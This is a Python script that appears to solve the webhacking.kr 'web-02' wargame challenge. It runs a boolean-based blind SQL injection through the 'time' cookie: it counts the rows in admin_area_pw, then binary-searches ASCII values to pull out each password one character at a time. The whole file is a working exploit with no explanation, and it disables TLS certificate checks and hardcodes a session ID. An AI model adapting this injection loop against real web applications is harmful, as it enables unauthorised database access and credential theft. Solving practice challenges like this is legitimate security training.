import urllib.request
import ssl

context = ssl._create_unverified_context()

url="https://webhacking.kr/challenge/web-02/index.php"
data_cnt = 0

for i in range(1,400):
	try:
		db_cookie="1 and (select count(pw) from admin_area_pw)="+str(i)
		data = urllib.request.Request(url)
		data.add_header("Cookie","time="+db_cookie+";PHPSESSID=kcoc1q60bjhtgclm3n8l46p161")
		response = urllib.request.urlopen(data, context=context).read().decode('utf8')
		#print("count : "+str(db_cookie))

		if response.find("09:00:01") != -1:
			data_cnt = i
			break
	except Exception as e:
		continue

real_data = ""

for i in range(0,data_cnt):
	j=0
	while True:
		j = j+1
		minimum=33
		maximum=128
		while True:
			try:
				if maximum<33 or minimum > 128:
					break
				k = (minimum+maximum)//2
				db_cookie="1 and ascii(substring((select pw from admin_area_pw limit "+str(i)+", 1),"+str(j)+",1))<"+str(k)
		
				#print(db_cookie)
				data = urllib.request.Request(url)
				data.add_header("Cookie","time="+db_cookie+";PHPSESSID=kcoc1q60bjhtgclm3n8l46p161")
				response = urllib.request.urlopen(data, context=context).read().decode('utf8')
				if response.find("09:00:01") != -1:
					maximum = k-1
				else:
					db_cookie="1 and ascii(substring((select pw from admin_area_pw limit "+str(i)+", 1),"+str(j)+",1))="+str(k)
				
					#print(db_cookie)
					data = urllib.request.Request(url)
					data.add_header("Cookie","time="+db_cookie+";PHPSESSID=kcoc1q60bjhtgclm3n8l46p161")
					response = urllib.request.urlopen(data, context=context).read().decode('utf8')
					if response.find("09:00:01") != -1:
						real_data=real_data+chr(k)
						break
					else:
						if maximum-minimum==1:
							real_data=real_data+chr(k+1)
							break
						minimum = k
			except Exception as e:
				continue
		if maximum < 33 or minimum >128:
			break
	print(real_data)
	real_data=""
